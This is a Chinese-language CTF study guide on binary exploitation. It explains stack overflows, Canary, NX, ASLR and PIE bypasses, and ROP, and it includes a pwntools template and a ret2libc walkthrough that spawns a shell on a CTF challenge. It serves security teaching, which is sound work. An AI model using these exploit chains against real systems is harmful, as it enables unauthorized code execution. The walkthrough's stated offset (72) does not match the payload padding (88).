# Pwn 入门：栈溢出 / Canary / NX / ASLR / PIE 保护与利用

> **📘 文档定位**：CISP 考试 CTF 安全 核心 | 难度：⭐⭐⭐⭐⭐ | 预计阅读：30 分钟
>
> 系统讲解 Pwn 方向的基础知识：栈溢出原理、Canary/NX/ASLR/PIE 保护机制、ROP 链构造及 pwntools 实战，是二进制安全的入门必修课。

---

## 导航目录

- [一、Pwn 基础概念](#一pwn-基础概念)
- [二、栈溢出原理与利用](#二栈溢出原理与利用)
- [三、Canary 保护与绕过](#三canary-保护与绕过)
- [四、NX/ASLR/PIE 保护与绕过](#四nxaslrpie-保护与绕过)
- [五、ROP 链构造](#五rop-链构造)
- [六、安全部署 Checklist](#六安全部署-checklist)
- [七、高分考点与知识巧记](#七高分考点与知识巧记)

---

## 📋 目录

1. [二进制基础](#一二进制基础)
2. [checksec 与保护机制](#二checksec)
3. [栈溢出与ROP](#三栈溢出)
4. [Canary 绕过](#四canary绕过)
5. [ASLR/PIE 绕过](#五aslrpie绕过)
6. [完整题目解析](#六完整题目)

---

## 一、二进制基础

```
内存布局:
  高地址 → 低地址
  ├── Stack (栈) — 局部变量、返回地址
  ├── Heap (堆)  — 动态分配
  ├── BSS       — 未初始化全局变量
  ├── Data      — 已初始化全局变量
  └── Text      — 代码段

x64 调用约定 (Linux):
  RDI, RSI, RDX, RCX, R8, R9 → 参数
  RAX → 返回值
  RSP → 栈指针
  RBP → 基址指针
  RIP → 指令指针
```

---

## 二、checksec

```bash
# 检查二进制保护
checksec ./pwn

# 输出解读:
# Arch:     amd64-64-little    → 64位架构
# RELRO:    Full RELRO         → GOT表只读(好)
# Stack:    Canary found       → 栈保护(需绕过)
# NX:       NX enabled         → 栈不可执行(不能用shellcode)
# PIE:      PIE enabled        → 地址随机化(需泄密)

# 各保护含义:
# Canary  → 返回地址前有金丝雀值 → 溢出会被检测
# NX      → 栈/堆不可执行 → ROP替代 Shellcode
# PIE     → 代码段地址随机 → 需先泄露基址
# Full RELRO → GOT只读 → 不能覆写GOT表
```

---

## 三、栈溢出

### pwntools 模板

```python
from pwn import *

# 连接
# io = remote('ctf.example.com', 10001)
io = process('./pwn')
elf = ELF('./pwn')

# 找 gadget
rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 构造 Payload
offset = 40  # 填充多少字节到返回地址
payload = b'A' * offset
payload += p64(ret)           # 栈对齐
payload += p64(pop_rdi)       # pop rdi; ret
payload += p64(0xdeadbeef)    # rdi = 参数
payload += p64(elf.sym['win']) # 调用 win函数

# 也可以直接用 ROP 对象:
rop.call(elf.sym['system'], [next(elf.search(b'/bin/sh'))])
payload = b'A' * offset + rop.chain()

io.sendline(payload)
io.interactive()
```

### 找偏移

```bash
# 方法1: gdb pattern
gdb ./pwn
pattern create 100
run
# 输入pattern → 查看崩溃时的RSP值
pattern offset $rsp
# → offset = 40

# 方法2: cyclic
cyclic 100
# → aaaabaaacaaadaaaeaaafaaagaaah...
# 程序崩溃时查 RSP 中的值
cyclic -l 0x6161616c  # 假设RSP=0x6161616c
# → 40
```

---

## 四、Canary 绕过

```
绕过方法:

1. 泄露 Canary (如果有输出功能)
   第一次溢出1字节 → 覆盖Canary最低位 → 泄露出来
   (Canary最低位总是\x00，覆盖后输出不带\x00 → 读出)

2. 通过 fork 子进程
   父进程 fork 子进程处理请求 → Canary 不变
   → 可以逐字节爆破(最多256×8=2048次尝试)

3. 修改 __stack_chk_fail 的 GOT
   如果有任意写 → 修改 GOT 表 → Canary 检测失效

4. 覆盖 TLS 中的 Canary
   如果能找到 TLS 地址 → 直接修改
```

---

## 五、ASLR/PIE

```
绕过 ASLR/PIE:

1. 泄露地址
   利用格式化字符串或任意读 → 读出某个已知偏移的地址
   libc_base = leaked - libc.sym['puts']
   
2. ROPgadget 搜索
   ROPgadget --binary ./pwn | grep "pop rdi"
   ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6

3. ret2libc
   泄露 libc 地址 → 计算 system 地址
   payload = p64(pop_rdi) + p64(binsh) + p64(system)

4. ret2csu
   利用 __libc_csu_init 中的通用 gadget
   → 不需要单独找 pop rdi
```

---

## 六、完整题目

```
题目: ret2libc (BUUCTF ciscn_2019_c_1)

分析:
  ✦ 64位，有NX(栈不可执行)
  ✦ 无system函数
  ✦ 有puts函数(可泄露libc)

解题步骤:

Step 1: 找偏移
  输入 100 个 A → 崩溃 → offset = 0x50 - 8 = 72

Step 2: 泄露 libc 地址
  payload = b'A' * 88          # RBP+8
  payload += p64(pop_rdi)
  payload += p64(elf.got['puts'])   # puts@GOT
  payload += p64(elf.plt['puts'])   # 打印puts的libc地址
  payload += p64(elf.sym['main'])   # 返回main，再次利用

  io.sendlineafter('Input: ', payload)
  io.recvuntil('\\n')
  leaked = u64(io.recv(6).ljust(8, b'\\x00'))

Step 3: 计算 system 地址
  libc_base = leaked - libc.sym['puts']
  system = libc_base + libc.sym['system']
  binsh = libc_base + next(libc.search(b'/bin/sh'))

Step 4: 第二次利用 → Get Shell
  payload = b'A' * 88
  payload += p64(ret)       # 栈对齐
  payload += p64(pop_rdi)
  payload += p64(binsh)
  payload += p64(system)
  io.sendline(payload)
  io.interactive()
```

---

## ✅ Pwn入门清单

- [ ] checksec 分析
- [ ] pwntools 基础
- [ ] GDB+pwndbg 调试
- [ ] 找溢出偏移
- [ ] ROP gadget 搜索
- [ ] ret2libc
- [ ] Canary 绕过原理
- [ ] pwnable.kr fd/collision/bof